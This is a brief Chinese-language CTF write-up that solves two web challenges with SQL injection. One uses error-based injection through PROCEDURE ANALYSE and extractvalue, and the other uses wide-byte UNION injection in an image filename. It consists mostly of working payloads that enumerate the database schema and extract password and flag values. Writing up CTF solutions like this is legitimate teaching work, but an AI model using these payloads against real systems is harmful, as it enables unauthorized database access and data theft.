4.到底能不能回显
url：
http://xxx.xxx.xxx/index.php?start=0&num=1
经过测试，只有start参数有作用，num参数并没有作用。
构造payload：
查询数据库名：
?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select database()))),1)%23&num=1
查询数据表名：
?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(table_name)from information_schema.tables where table_schema=database()))),1)%23&num=1
查询列名：(由于分号被过滤了，只能将表名转换成16进制)
?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(column_name)from information_schema.columns where table_name=0x75736572))),1)%23&num=1
查询flag：
?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select password from mydbs.user limit 2,1))),1)%23&num=1
5.邂逅
url：
http://xxx.xxx.xxx/images/dog1.jpg
真的是第一次见图片后缀前面注入，加宽字节注入，因为无回显，所以用burp注入
构造payload：
查询注入点：
dog1%df'.jpg
页面报错
查询列数：4列
dog1%df%27 order by 4 %23.jpg
查询显示位：3
dog1%df%27 union select 1,2,3,4%23.jpg
查询数据库：mydbs
dog1%df%27 union select 1,2,(select database()),4 %23.jpg

查询表名：article,pic
dog1%df%27 union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()),4 %23.jpg
查询列名：id,picname,data,text
dog1%df%27 union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=0x706963),4 %23.jpg
查询数据（flag）：
dog1%df%27 union select 1,2,(select picname from pic limit 2,1),4 %23.jpg
